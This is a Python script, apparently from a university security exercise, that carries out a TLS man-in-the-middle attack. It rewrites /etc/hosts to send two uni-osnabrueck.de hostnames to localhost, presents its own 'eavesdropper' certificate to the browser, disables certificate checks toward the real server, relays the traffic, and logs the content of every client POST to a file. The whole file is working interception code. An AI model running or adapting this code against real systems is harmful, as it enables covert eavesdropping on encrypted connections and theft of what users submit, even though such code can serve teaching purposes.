import socket
import ssl
import time

def Main():
    modify_hosts("127.0.0.1")
    eavesdropper_mitm()
    restore_hosts()


def restore_hosts():
    """Restores /etc/hosts
       """
    content = []
    with open("/etc/hosts") as f:
        pagename1 = "lovegood.informatik.uni-osnabrueck.de"
        pagename2 = "diggory.informatik.uni-osnabrueck.de"
        line = f.readline()
        while(line != ''):
            l_split = line.split()
            # ignore line if it contains either one of the pagenames
            if(len(l_split) > 1 and (l_split[1] == pagename1 or
                l_split[1] == pagename2)):
                None
            else:
                content.append(line)
            line = f.readline()
    with open("/etc/hosts", "w") as f:
        for l in content:
            f.write(l)


def modify_hosts(host):
    """Modifies /etc/hosts
       :param host: host that will to receive the redirected traffic
       """
    content = [] 
    with open("/etc/hosts") as f:
        found1 = found2 = False
        pagename1 = "lovegood.informatik.uni-osnabrueck.de"
        pagename2 = "diggory.informatik.uni-osnabrueck.de"
        line = f.readline() 
        while(line != ''):
            l_split = line.split()
            # if either of the pagenames is found while reading the file
            # replace destination with the new host
            if(not found1 and len(l_split) > 1 and l_split[1] == pagename1):
                line = line.replace(l_split[0], host)
                found1 = True
            elif(not found2 and len(l_split) > 1 and l_split[1] == pagename2):
                line = line.replace(l_split[0], host)
                found2 = True
            content.append(line)
            line = f.readline()
    # if either (or both) of the pagenames have not been found, append them
    # to the end of the file
    if(not found1):
        content.append(host + '\t' + pagename1 + '\n')
    if(not found2):
        content.append(host + '\t' + pagename2 + '\n')
    with open("/etc/hosts", "w") as f:
        for l in content:
            f.write(l)


def startup(base_sock, server_sock, client_sock):
    """Handels the initial connection of client and server
       :param base_sock: socket that was used connected to the client(browser)
                         only needed if connection is lost
       :param server_sock: socket to communicate with the server
       :param client_sock: socket to communicate with the client
       :return the servers response, server socket and client socket
       """
    i = 0
    while(i < 2):
        client_total = ''
        server_total = ''
        while(not client_total):
            try:
                data = client_sock.recv(1024)
                while(data):
                    client_total += data.decode()
                    data = client_sock.recv(1024)
                # is the socket still connected?
                if(not data):
                    client_sock.close()
                    newsock, address = base_sock.accept()
                    client_sock = ssl.wrap_socket(newsock, server_side = True, 
                            certfile = "eavesdropper.cert.pem",
                            keyfile = "eavesdropper.key.pem") 
                    client_sock.settimeout(0.1)
            except (ssl.SSLError, socket.timeout):
                pass
        server_sock.sendall(client_total.encode())
        while(not server_total):
            try:
                data = server_sock.recv(1024)
                while(data):
                    server_total += data.decode()
                    data = server_sock.recv(1024)
            except socket.timeout:
                pass
        client_sock.sendall(server_total.encode())
        i += 1
    return server_total, server_sock, client_sock


def write_data(data):
    """Writes data to log.txt
       :param data: text received from the client
       """
    with open("log.txt", "r+") as log:
        # skip to the end of the file
        log.seek(0, 2)
        # only log text that was written by the client
        log.write(data.split()[-1] + '\n')


def client_server_loop(addr, context, server_total, server_sock, client_sock):
    """Handles communication between client and server
       :param addr: ip address and port of the server (in case connection is lost)
       :param context: context needed to reconnect server_sock
       :param server_total: response of the server
       :param server_sock: socket to communicate with the server
       :param client_sock: socket to communicate with the client
       """
    # loop until interrupted
    while(1):
        client_total = ''
        while(not client_total):
            try:
                # receive all data from the client
                data =  client_sock.recv(1024).decode()
                while(data):
                    client_total += data
                    data = client_sock.recv(1024).decode()
            except socket.timeout:
                pass
        # did the client try to post a message?
        if(client_total.split()[0] == "POST"):
            write_data(client_total)
            server_sock.sendall(client_total.encode())
            server_total = ''
            while(not server_total):
                try:
                    data = server_sock.recv(1024)
                    # is the connection to the sever still active?
                    if(not data):
                        server_sock.close()
                        server_sock = context.wrap_socket(socket.socket(),
                                server_hostname="131.173.33.213") 
                        server_sock.connect(addr)
                        server_sock.settimeout(0.1)
                        server_sock.sendall(client_total.encode())
                        continue
                    while(data):
                        server_total += data.decode()
                        data = server_sock.recv(1024)
                except socket.timeout:
                    pass
        client_sock.sendall(server_total.encode())
        time.sleep(0.01)


def eavesdropper_mitm():
    """Creates the eavesdropper man in the middle server
       """
    addr = ("131.173.33.213", 443)
    addr_back = ("131.173.33.209", 443)
    try:
        sock = socket.socket()
        sock.bind(("127.0.0.1", 443))
        sock.listen(5)
    except socket.error as err1:
        print("err: %s" % str(err1))
        return -1
    try:
        # create client and server socket
        newsock, address = sock.accept()
        client_ssl_sock = ssl.wrap_socket(newsock, server_side = True, 
                certfile = "eavesdropper.cert.pem",
                keyfile = "eavesdropper.key.pem") 
        client_ssl_sock.settimeout(0.1)
        context = ssl.SSLContext()
        # do not require a certificate from the browser
        context.verify_mode = ssl.CERT_NONE
        context.check_hostname = False
        server_ssl_sock = context.wrap_socket(socket.socket(),
                server_hostname="131.173.33.213") 
        server_ssl_sock.connect(addr)
        server_ssl_sock.settimeout(0.1)
        # startup
        server_total, server_ssl_sock, client_ssl_sock = startup(sock,
                server_ssl_sock, client_ssl_sock)
        # loop
        client_server_loop(addr, context, server_total, server_ssl_sock,
                client_ssl_sock)
    except KeyboardInterrupt:
        print("interrupt received, exiting...")
        server_ssl_sock.close()
        client_ssl_sock.close()
        sock.close()

if __name__ == "__main__":
    Main()
